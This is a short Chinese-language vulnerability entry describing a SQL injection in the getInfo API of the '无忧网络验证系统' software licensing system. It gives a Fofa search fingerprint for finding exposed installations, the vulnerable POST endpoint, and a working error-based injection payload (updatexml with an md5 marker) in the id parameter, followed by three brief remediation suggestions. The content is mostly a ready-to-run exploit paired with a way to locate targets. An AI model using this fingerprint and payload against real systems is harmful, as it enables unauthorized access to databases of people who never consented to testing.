# 无忧网络验证系统getInfoSQL注入

- **系统**：无忧网络验证系统getInfo　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="zhuya/js/base.js"`
- **请求**：`POST /index.php/api/Software/getInfo HTTP/1.1`

**请求体 / payload**
```
1. Fofa
body="zhuya/js/base.js"
2、部分界面如下
3、隐患url,复现如下
Host: your-ip
Content-Type: application/x-www-form-urlencoded
data=1&id=1 and updatexml(1,concat(0x7e,md5(12345),0x7e),1)
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。